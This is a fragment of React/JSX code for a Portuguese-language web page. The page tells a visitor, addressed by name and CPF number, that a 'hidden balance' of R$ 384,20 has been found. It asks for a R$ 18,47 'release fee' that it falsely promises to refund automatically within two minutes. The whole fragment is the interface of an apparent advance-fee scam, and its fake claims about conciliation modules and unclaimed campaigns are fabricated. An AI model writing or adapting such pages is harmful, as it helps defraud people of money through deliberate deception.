  ...
  return (
    <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto pt-6">
      ...
      <main className="px-3 py-4 max-w-lg mx-auto pb-24">
        ...
        <div className="bg-[#FFF8E1] border border-[#FFD54F] rounded-xl p-4 mb-3"><div className="flex items-start gap-2"><span className="text-lg leading-none mt-0.5">🎁</span><div><p className="text-gray-900 text-sm font-bold mb-1">{firstName ? `${firstName}, Saldo Oculto Detectado no Seu CPF` : "Saldo Oculto Detectado no Seu CPF"}</p><p className="text-gray-700 text-xs leading-relaxed">O sistema identificou um <span className="font-bold">crédito adicional não listado</span> na primeira verificação. Esse valor estava retido no módulo de conciliação e precisa ser liberado manualmente.</p></div></div></div>
        <div className="bg-white rounded-xl p-5 shadow-sm mb-3">
          ...
          <div className="bg-gradient-to-r from-[#FFF8E1] to-[#FFF3E0] rounded-lg p-4 mb-4 border border-amber-100"><p className="text-gray-500 text-[10px] text-center mb-1">BÔNUS OCULTO ENCONTRADO</p><p className="text-2xl font-black text-center text-gray-900">R$ 384,20</p><p className="text-green-600 text-[10px] text-center font-semibold mt-1">Será somado ao seu saldo de {balance}</p></div>
           <div className="space-y-2 mb-4">{["Valor vinculado ao CPF " + (leadCpf || "do titular") + " no banco de dados", "Crédito proveniente de campanhas anteriores não resgatadas", "A taxa de liberação de R$ 18,47 é reembolsada em até 2 minutos"].map((t, i) => (<div key={i} className="flex items-start gap-2"><span className="text-green-500 text-sm mt-0.5">✓</span><p className="text-gray-700 text-xs leading-relaxed"><span className="font-bold">{t}</span></p></div>))}</div>
           <div className="bg-gray-50 rounded-lg p-3 mb-4 border border-gray-100"><div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-[11px]">Taxa de liberação:</span><span className="text-gray-900 text-sm font-bold">R$ 18,47</span></div><div className="flex items-center justify-between"><span className="text-gray-500 text-[11px]">Reembolso automático:</span><span className="text-green-600 text-[11px] font-bold">✓ Em até 2 min</span></div></div>
